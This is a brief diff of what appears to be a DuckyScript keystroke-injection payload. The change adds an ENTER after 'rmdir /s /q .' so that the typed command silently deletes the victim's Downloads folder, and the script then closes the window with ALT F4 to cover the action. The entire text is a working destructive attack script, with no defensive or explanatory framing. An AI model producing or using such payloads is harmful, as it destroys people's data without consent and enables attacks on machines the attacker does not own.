@@ -12,6 +12,7 @@ DELAY 250
 STRING cd Downloads
 DELAY 1
 STRING rmdir /s /q .
+ENTER
 DELAY 125
 ALT F4
 DELAY 25
